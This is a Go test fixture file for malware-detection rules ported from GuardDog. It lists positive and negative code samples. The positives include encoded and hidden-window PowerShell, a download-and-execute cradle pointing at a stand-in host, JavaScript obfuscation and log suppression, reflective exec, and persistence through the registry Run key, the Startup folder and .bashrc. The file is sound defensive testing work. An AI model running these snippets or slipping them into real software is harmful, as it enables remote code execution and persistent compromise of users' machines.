package main

// Fixtures for the evasion and Windows-persistence rules ported from
// GuardDog: PowerShell cradles, JavaScript name mangling, log suppression,
// reflective API resolution, autostart persistence and host enumeration.

func init() {
	positives = append(positives, evasionPositives...)
	negatives = append(negatives, evasionNegatives...)
}

// mangledJS mirrors the shape of upstream's js-mangling sample: several
// distinct _0x identifiers, which is what the rule counts.
const mangledJS = `const _0x112fa8 = _0x180f;
(function(_0x13c8b9, _0x35f660) {
    const _0x15b386 = _0x180f;
    var _0x66ea25 = _0x13c8b9();
}());`

var evasionPositives = []fixture{
	// upstream: threat-process-powershell-encoded
	{"powershell-encoded", "drop.py",
		`os.system("powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA")`},
	{"powershell-encoded", "cradle.js",
		`exec("IEX (New-Object Net.WebClient).DownloadString('http://stage.example/a')")`},
	{"powershell-encoded", "hidden.py",
		`subprocess.Popen("powershell -WindowStyle Hidden -enc QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEA")`},

	// upstream: threat-runtime-obfuscation-js-mangling
	{"js-mangling", "packed.js", mangledJS},

	// upstream: threat-runtime-obfuscation-log-suppress
	{"js-log-suppress", "quiet.js", `
console.log = function () {};
const s = String.fromCharCode(101, 118, 97, 108);
`},

	// upstream: threat-runtime-obfuscation-api
	{"obfuscation-api", "reflect.py", `getattr(__builtins__, "exec")(payload)`},
	{"obfuscation-api", "desc.js",
		`Object.getOwnPropertyDescriptor(globalThis, key).value(arg);`},

	// upstream: threat-filesystem-autostart
	{"autostart-persistence", "persist.py", `
import winreg
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, payload_path)
`},
	{"autostart-persistence", "startup.js",
		`fs.writeFileSync(process.env.APPDATA + "\\Start Menu\\Programs\\Startup\\u.vbs", s);`},
	// Upstream's own sample. The startup file and the write are on different
	// lines, which the line-scoped shell-persistence rule cannot see.
	{"autostart-persistence", "unix.py", `
import os


def persist(payload):
    rc = os.path.expanduser("~/.bashrc")
    with open(rc, "a") as f:
        f.write(payload)
`},

	// upstream: threat-runtime-enumeration
	{"runtime-enumeration", "recon.py", `
import psutil, netifaces
procs = psutil.process_iter()
ifaces = netifaces.interfaces()
`},
}

var evasionNegatives = []fixture{
	// Invoking PowerShell normally, without an encoded payload, hidden
	// window or download cradle.
	{"powershell-encoded", "build.py",
		`subprocess.run(["powershell", "-File", "build.ps1"])`},

	// Ordinary hex constants and short identifiers are not name mangling.
	{"js-mangling", "colors.js", `const RED = 0xff0000, GREEN = 0x00ff00, BLUE = 0x0000ff;`},

	// Silencing a logger without any obfuscation nearby is a normal, if
	// blunt, thing to do in tests.
	{"js-log-suppress", "quiet_test.js", `console.log = function () {};`},

	// Reflection that does not immediately invoke the resolved value.
	{"obfuscation-api", "inspect.py", `names = [getattr(obj, n) for n in dir(obj)]`},
	{"obfuscation-api", "keys.js", `const ks = Object.keys(config).filter(Boolean);`},

	// Upstream's benign autostart sample: a profile attribute is not a shell
	// startup file, and urlopen must not satisfy the write condition.
	{"autostart-persistence", "conn.py", `
class Connection:
    def __init__(self, profile):
        self.profile = profile

    def fetch(self, url):
        with urlopen(url) as response:
            return response.read()
`},
	// Reading the registry for a legitimate setting is not persistence.
	{"autostart-persistence", "theme.py", `
import winreg
k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Themes")
`},

	// A single enumeration signal is not recon; the rule wants two.
	{"runtime-enumeration", "metrics.py", `
import psutil
for p in psutil.process_iter():
    record(p.name())
`},
}
